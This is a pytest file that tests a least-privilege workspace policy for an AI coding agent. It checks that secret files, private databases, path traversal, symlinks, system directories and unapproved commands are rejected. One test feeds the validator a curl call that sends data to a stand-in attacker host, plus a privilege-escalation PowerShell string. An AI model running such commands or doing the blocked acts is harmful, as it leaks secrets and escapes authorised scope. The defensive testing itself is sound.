"""Security and Least-Privilege Policy Integration Tests for Antigravity Coding Agent (Phase 10).

Validates the 8 critical security boundaries:
1. Accessing a file outside the project workspace.
2. Editing an unrelated repository outside authorized development directories.
3. Reading/modifying .env secret files.
4. Accessing JARVIS's private database (tasks.db, memory.db).
5. Writing or traversing through a symlink or junction.
6. Executing an unapproved command (wildcard or dangerous tokens).
7. Attempting directory path traversal (../../).
8. Attempting to target Windows system directories (C:\\Windows, System32).
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

import pytest

from tools.coding_agent.exceptions import WorkspacePolicyViolationError
from tools.coding_agent.result_verifier import CodingResultVerifier
from tools.coding_agent.workspace_policy import WorkspacePolicy


@pytest.fixture
def isolated_workspace(tmp_path: Path):
    """Fixture providing a clean authorized temporary workspace directory."""
    ws = tmp_path / "valid_dev_project"
    ws.mkdir(parents=True, exist_ok=True)
    return ws


# ==============================================================================
# 1. Accessing a file outside the project
# ==============================================================================
def test_security_accessing_file_outside_project_rejected(isolated_workspace: Path, tmp_path: Path):
    """Attempting to resolve or access a file outside the workspace raises WorkspacePolicyViolationError."""
    outside_file = tmp_path / "outside_secret.txt"
    outside_file.write_text("classified", encoding="utf-8")

    with pytest.raises(WorkspacePolicyViolationError) as exc_info:
        WorkspacePolicy.validate_file_access(isolated_workspace, outside_file)

    assert "Path traversal violation" in str(exc_info.value)
    assert "outside workspace" in str(exc_info.value)


# ==============================================================================
# 2. Editing an unrelated repository
# ==============================================================================
def test_security_unrelated_unauthorized_repository_rejected(tmp_path: Path):
    """Workspaces located in unauthorized directories are rejected by WorkspacePolicy."""
    unrelated_repo = Path("C:/SomeRandomFolder/unauthorized_repo")

    with (
        patch("pathlib.Path.exists", return_value=True),
        patch("pathlib.Path.is_dir", return_value=True),
    ):
        with pytest.raises(WorkspacePolicyViolationError) as exc_info:
            WorkspacePolicy.validate_workspace(unrelated_repo)

        assert "not inside an authorized development directory" in str(
            exc_info.value
        ) or "Root drive" in str(exc_info.value)


# ==============================================================================
# 3. Reading or modifying .env
# ==============================================================================
def test_security_reading_or_modifying_env_rejected(isolated_workspace: Path):
    """Accessing or modifying .env or .env.production is strictly forbidden."""
    env_file = isolated_workspace / ".env"

    with pytest.raises(WorkspacePolicyViolationError) as exc_info:
        WorkspacePolicy.validate_file_access(isolated_workspace, env_file)

    assert "Access denied to sensitive secret/database file" in str(exc_info.value)

    # Also verify diff validator rejects it
    with pytest.raises(WorkspacePolicyViolationError) as diff_exc:
        WorkspacePolicy.validate_modified_files(isolated_workspace, [".env"])
    assert "Modification of sensitive file" in str(diff_exc.value)


# ==============================================================================
# 4. Accessing JARVIS's private database
# ==============================================================================
def test_security_accessing_jarvis_private_database_rejected(isolated_workspace: Path):
    """Targeting JARVIS internal database files is blocked."""
    db_file = isolated_workspace / "tasks.db"

    with pytest.raises(WorkspacePolicyViolationError) as exc_info:
        WorkspacePolicy.validate_file_access(isolated_workspace, db_file)

    assert "Access denied to sensitive secret/database file" in str(exc_info.value)

    # Also verify diff validator rejects database modifications
    with pytest.raises(WorkspacePolicyViolationError):
        WorkspacePolicy.validate_modified_files(isolated_workspace, ["data/tasks.db"])


# ==============================================================================
# 5. Writing through a symlink or junction
# ==============================================================================
def test_security_writing_through_reparse_point_rejected(isolated_workspace: Path):
    """Reparse points (symlinks/junctions) are rejected by security policy."""
    symlink_file = isolated_workspace / "linked_target.txt"

    with patch("tools.coding_agent.workspace_policy.is_reparse_point", return_value=True):
        with pytest.raises(WorkspacePolicyViolationError) as exc_info:
            WorkspacePolicy.validate_file_access(isolated_workspace, symlink_file)

        assert "Reparse points and symlinks are prohibited" in str(exc_info.value)

        # Also verify diff validator rejects reparse points
        with pytest.raises(WorkspacePolicyViolationError):
            WorkspacePolicy.validate_modified_files(isolated_workspace, ["linked_target.txt"])


# ==============================================================================
# 6. Executing an unapproved command
# ==============================================================================
def test_security_unapproved_command_and_wildcard_rejected():
    """Wildcards, privilege escalation, and unapproved commands are rejected."""
    # Wildcard
    with pytest.raises(WorkspacePolicyViolationError) as exc_info:
        WorkspacePolicy.validate_command_string("command(*)")
    assert "Wildcard command execution" in str(exc_info.value)

    # Privilege escalation / UAC
    with pytest.raises(WorkspacePolicyViolationError) as uac_exc:
        WorkspacePolicy.validate_command_string("powershell Start-Process -Verb runAs notepad")
    assert "prohibited security token" in str(uac_exc.value)

    # Unapproved command
    with pytest.raises(WorkspacePolicyViolationError) as unapp_exc:
        WorkspacePolicy.validate_command_string("curl http://attacker.com/leak")
    assert "not in the approved development operations whitelist" in str(unapp_exc.value)

    # Approved commands pass cleanly
    WorkspacePolicy.validate_command_string("pytest -q")
    WorkspacePolicy.validate_command_string("python -m pytest tests/")
    WorkspacePolicy.validate_command_string("git status")
    WorkspacePolicy.validate_command_string("ruff check .")


# ==============================================================================
# 7. Attempting path traversal
# ==============================================================================
def test_security_path_traversal_rejected(isolated_workspace: Path):
    """Path traversal sequences (../../) escaping workspace root are rejected."""
    traversal_path = isolated_workspace / ".." / ".." / "Windows" / "System32" / "drivers"

    with pytest.raises(WorkspacePolicyViolationError) as exc_info:
        WorkspacePolicy.validate_file_access(isolated_workspace, traversal_path)

    assert "Path traversal violation" in str(exc_info.value)


# ==============================================================================
# 8. Attempting to modify Windows system directories
# ==============================================================================
def test_security_targeting_windows_system_directories_rejected():
    """Windows system directories (C:\\Windows, System32) cannot be authorized workspaces."""
    sys_dir = Path("C:/Windows/System32")
    if sys_dir.exists():
        with pytest.raises(WorkspacePolicyViolationError) as exc_info:
            WorkspacePolicy.validate_workspace(sys_dir)

        assert "System directory cannot be an authorized coding workspace" in str(exc_info.value)


# ==============================================================================
# Integration: CodingResultVerifier diff rejection
# ==============================================================================
def test_result_verifier_flags_security_violation_in_diff(isolated_workspace: Path):
    """CodingResultVerifier marks task unverified if unauthorized file modified."""
    verifier = CodingResultVerifier(isolated_workspace)
    with patch.object(verifier, "_check_git_status_and_diff", return_value=([".env"], "diff")):
        res = verifier.verify_workspace()
        assert res.verified is False
        assert "Security Policy Violation" in res.message
